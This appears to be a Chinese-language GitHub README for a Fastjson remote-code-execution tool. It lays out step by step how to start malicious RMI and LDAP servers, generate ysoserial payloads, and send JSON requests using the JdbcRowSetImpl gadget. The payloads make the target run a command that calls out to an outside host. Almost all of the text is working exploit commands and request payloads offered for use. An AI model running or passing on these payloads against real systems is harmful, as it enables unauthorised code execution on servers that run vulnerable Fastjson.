# fastjson_rce_tool

```
备注：这里的利用方式可以突破一些限制条件，来完成命令执行。

rmi:
1. 启动RMI服务，后面写要执行的语句(有依赖，tomcat8稳定复现)
java -cp fastjson_tool.jar EvilRMIServer 8888 53 "curl wyzxxz.cn"

2. 发送请求包
POST /test HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
Accept-Encoding: gzip, deflate
Connection: close
Accept: */*
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) 

{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://ip:8888/Object","autoCommit":true}

3. 查看日志是否curl成功



ldap:
1. 用下面命令生成base64编码过的测试语句
java -jar ysoserial6.jar URLDNS 'http://wyzxxz.cn'|base64 > base64_payload_file

2. 启动LDAP服务
java -cp fastjson_tool.jar LDAPRefServer2 8888  base64_payload_file

3. 发送请求包
POST /test HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
Accept-Encoding: gzip, deflate
Connection: close
Accept: */*
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) 

{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ip:8888/Object","autoCommit":true}

4. 查看日志是否执行成功，如果没有，用ysoserial的其他Payload尝试生成。

else:

有些环境可能利用不成功，可以尝试默认的测试方法,
例如：
生成测试的class文件，启动http服务器
启动ldap服务，从http服务获取class
java -cp fastjson_tool.jar LDAPRefServer http://ip:port/#Object 8888

```


![0](https://github.com/wyzxxz/fastjson_rce_tool/blob/master/work.png)

![1](https://github.com/wyzxxz/fastjson_rce_tool/blob/master/2.png)

